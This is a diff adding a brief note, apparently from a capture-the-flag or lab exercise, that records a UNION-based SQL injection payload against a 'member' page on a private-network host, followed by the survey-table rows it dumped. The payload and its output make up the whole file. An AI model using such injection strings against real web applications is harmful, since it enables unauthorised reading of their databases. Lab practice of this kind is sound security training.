@@ -1,0 +1,29 @@
+http://192.168.1.16/?page=member
+9 UNION SELECT id_vote, vote FROM Member_survey.vote_dbs
+	UNION SELECT id_vote, nb_vote FROM Member_survey.vote_dbs
+	UNION SELECT id_vote, subject FROM Member_survey.vote_dbs--
+
+id_vote: 2
+vote : 4218.18994140625
+nb_vote : 4256
+subject : wil
+
+id_vote: 3
+vote : 5.4375
+nb_vote : 16
+subject : alex
+
+id_vote: 4
+vote : 8.647069931030273
+nb_vote : 17
+subject : Thor
+
+id_vote: 5
+vote : 9.100000381469727
+nb_vote : 666
+subject : Ben
+
+id_vote: 6
+vote : 6.968999862670898
+nb_vote : 69
+subject : ol
